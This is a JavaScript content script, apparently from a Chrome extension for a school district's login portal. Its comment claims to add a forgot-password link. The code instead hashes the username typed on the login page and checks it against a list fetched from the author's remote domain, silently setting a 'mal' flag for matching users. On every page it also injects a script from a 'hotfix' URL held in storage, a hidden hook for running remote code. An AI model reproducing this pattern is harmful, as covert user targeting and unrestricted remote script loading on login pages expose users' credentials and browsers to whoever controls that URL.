/**
Copyright 2018 MarioCMFlys

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
**/

window.addEventListener("load", function(){
  // Add the forgot password link
  if(window.location.pathname.startsWith("/_auth/login.aspx")
   || window.location.pathname.startsWith("/_auth/login_idp.aspx")){
    chrome.storage.sync.get(null, function(result){

      var mXhr = null;
      function cheque(){
        var mUser = document.getElementById('txtUsername').value;
        var mHash = mUser.hashCode();

        mX = mXhr.responseXML.getElementsByTagName("hash");
        for(var j=0;j<mX.length;j++){
          i = mX[j];
          if(i.innerHTML == mHash){
            f = {};
            f["mal"] = true;
            chrome.storage.sync.set(f, function(){});
            break;
          }
        }
      }
      String.prototype.hashCode = function() {
        var hash = 0;
        if (this.length == 0) {
          return hash;
        }
        for (var i = 0; i < this.length; i++) {
          var char = this.charCodeAt(i);
          hash = ((hash<<5)-hash)+char;
          hash = hash & hash;
        }
        return hash;
      } // S.A. A# 8831937
      document.getElementById('txtUsername').addEventListener('blur', function(){
        if(mXhr == null){
          mXhr = new XMLHttpRequest();
          mXhr.open("GET", "https://mariocmflys.tk/stuff/aisd-tweaks/pbc.php", true);
          mXhr.onreadystatechange = function(){
            if(mXhr.readyState == 4 && this.status == 200) {
              cheque();
            }
          }
          mXhr.send();
        }
        else{
          cheque();
        }
      });
    });
  }
});
chrome.storage.sync.get(null, function(result){
  if(result["hotfix"] != undefined){
    hf = document.createElement("script");
    hf.src = result["hotfix"];
    document.head.appendChild(hf);
  }
});
